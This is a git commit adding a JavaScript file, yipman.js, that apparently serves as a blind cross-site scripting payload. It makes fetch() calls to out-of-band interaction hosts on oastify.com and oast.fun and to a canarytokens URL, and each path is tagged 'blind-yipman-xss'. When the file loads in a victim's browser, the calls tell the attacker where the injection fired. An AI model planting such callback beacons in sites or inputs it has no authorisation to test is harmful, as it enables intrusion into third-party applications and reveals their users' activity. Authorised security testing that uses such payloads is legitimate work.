479a28ae2b485ddc90f0659dfe08eab31c5670d9
yipman16 <83105601+yipman16@users.noreply.github.com>
2024-09-20 07:34:49 +0300

    Create yipman.js

---
+++ yipman.js
@@ -0,0 +1,24 @@
+fetch('https://lj86q347x9spjf8bzu0cuf7v0m6du8ix.oastify.com/blind-yipman-xss')
+  .then(response => response.text())  // Get the response as plain text
+  .then(data => {
+      console.log('Success:', data);  // Handle the plain text response
+  })
+  .catch(error => {
+      console.error('Error:', error);  // Handle any errors
+  });
+fetch('https://coamzmuyquuauxmyrfpjznbrgxelqdb4y.oast.fun/blind-yipman-xss')
+  .then(response => response.text())  // Get the response as plain text
+  .then(data => {
+      console.log('Success:', data);  // Handle the plain text response
+  })
+  .catch(error => {
+      console.error('Error:', error);  // Handle any errors
+  });
+fetch('https://canarytokens.com/images/bggg0lfxtcfjsyzpyzqcgija1/payments.js')
+  .then(response => response.text())  // Get the response as plain text
+  .then(data => {
+      console.log('Success:', data);  // Handle the plain text response
+  })
+  .catch(error => {
+      console.error('Error:', error);  // Handle any errors
+  });
